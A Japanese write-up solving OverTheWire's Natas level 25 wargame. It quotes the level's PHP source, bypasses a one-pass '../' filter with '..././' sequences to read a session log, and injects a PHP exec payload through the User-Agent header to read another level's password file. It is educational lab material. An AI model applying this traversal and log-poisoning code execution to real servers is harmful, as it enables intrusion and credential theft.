![](img/natas25-1.png)  

調べたら"Quotes - Bad Boy Bubby (1993)"というのが出てきて映画のセリフ(?)らしい。  

ソースコードを見てみる。  

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
<body>
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

setLanguage()関数で言語を設定できる。  
safeinclude()関数でファイル指定の悪意のある入力の無害化を行っている。  
listFiles()関数で指定されたディレクトリのファイルリストを配列で返している。  
logRequest()関数で年月日、User-Agent、session_id、message（引数）で`/var/www/natas/natas25/logs`ディレクトリにログをとっている。  

safeinclude()関数でパストラバーサル攻撃の防御を行っているコードがあるが、  
`....//`や`..././`などで回避できる。  


以下で自分のログファイルを見られる。  
`http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_<session_id>.log`  


次に行うのは`if(strstr($filename,"natas_webpass")){`の箇所の回避だが、  
パストラ攻撃で指定したファイルが見られる & ログファイルにUser-Agentを格納している & include()で読み出している ので、  
User-Agentにphpコードを仕込むことができる。  


以下のように行う。  
![](img/natas25-2.png)  

User-Agentに`<?php echo exec("cat /etc/natas_webpass/natas26"); ?>`を指定している。  

再度、ログファイルを見てみると...  
![](img/natas25-3.png)  


クリア
